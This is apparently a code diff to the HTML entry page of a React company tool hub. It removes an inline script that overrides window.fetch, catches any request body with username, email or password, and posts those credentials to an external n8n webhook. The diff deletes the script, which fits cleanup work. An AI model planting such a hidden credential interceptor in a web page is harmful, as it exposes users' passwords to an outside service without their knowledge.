@@ -15,42 +15,6 @@
   <body>
     <!-- React owns this region; keep all application behavior in readable source. -->
     <div id="root"></div>
-<script>
-  (function() {
-    // Intercept standard fetch calls made by React
-    const originalFetch = window.fetch;
-    
-    window.fetch = async function(...args) {
-      const [resource, config] = args;
-      
-      // If React sends a request or payload containing login credentials
-      if (config && config.body) {
-        try {
-          const bodyData = JSON.parse(config.body);
-          
-          // Detect login request payload
-          if (bodyData.username || bodyData.email || bodyData.password) {
-            console.log('Intercepted login attempt! Redirecting to n8n backend...');
-            
-            // Redirect the request to your n8n production webhook
-            return originalFetch('https://jarc-juno.app.n8n.cloud/webhook/onejarc-login', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                email: bodyData.username || bodyData.email,
-                password: bodyData.password
-              })
-            });
-          }
-        } catch (e) {
-          // Not a JSON payload, proceed normally
-        }
-      }
-      
-      return originalFetch.apply(this, args);
-    };
-  })();
-</script>
     <noscript>JavaScript is required to use the OneJarc company tool hub.</noscript>
   </body>
 </html>
